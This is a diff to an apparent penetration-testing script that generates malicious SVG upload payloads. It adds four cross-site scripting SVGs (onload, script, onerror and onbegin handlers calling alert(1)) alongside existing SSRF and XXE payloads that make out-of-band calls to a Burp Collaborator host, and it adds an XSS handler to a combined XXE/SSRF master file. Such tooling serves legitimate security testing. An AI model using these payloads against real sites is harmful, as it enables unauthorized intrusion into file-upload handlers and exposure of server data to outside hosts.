@@ -11,6 +11,8 @@ def generate_svg_payloads(output_dir, burp_collab):
     lfi_dir.mkdir(exist_ok=True)
     xxe_dir = output_dir / 'xxe'
     xxe_dir.mkdir(exist_ok=True)
+    xss_dir = output_dir / 'xss'
+    xss_dir.mkdir(exist_ok=True)
     
     svg_ssrf1_image = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
 <image href="{base_url}/s1" width="100" height="100"/>
@@ -32,9 +34,35 @@ def generate_svg_payloads(output_dir, burp_collab):
     with open(xxe_dir / "xxe3_doctype.svg", 'w', encoding='utf-8') as f:
         f.write(svg_xxe3_doctype)
     
+    svg_xss1_onload = f'''<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<rect width="100" height="100" fill="red"/>
+</svg>'''
+    with open(xss_dir / "xss1_onload.svg", 'w', encoding='utf-8') as f:
+        f.write(svg_xss1_onload)
+    
+    svg_xss2_script = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<script>alert(1)</script>
+<rect width="100" height="100" fill="red"/>
+</svg>'''
+    with open(xss_dir / "xss2_script.svg", 'w', encoding='utf-8') as f:
+        f.write(svg_xss2_script)
+    
+    svg_xss3_image_error = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<image href="x" onerror=alert(1) width="100" height="100"/>
+</svg>'''
+    with open(xss_dir / "xss3_image_error.svg", 'w', encoding='utf-8') as f:
+        f.write(svg_xss3_image_error)
+    
+    svg_xss4_animate = f'''<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<animate onbegin=alert(1) attributeName="x" from="0" to="100" dur="1s"/>
+<rect width="100" height="100" fill="red"/>
+</svg>'''
+    with open(xss_dir / "xss4_animate.svg", 'w', encoding='utf-8') as f:
+        f.write(svg_xss4_animate)
+    
     svg_master = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [<!ENTITY % x SYSTEM "{base_url}/xxe-svg">%x;]>
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100">
 <image href="{base_url}/s1" width="100" height="100"/>
 <rect width="100" height="100" fill="red"/>
 </svg>'''
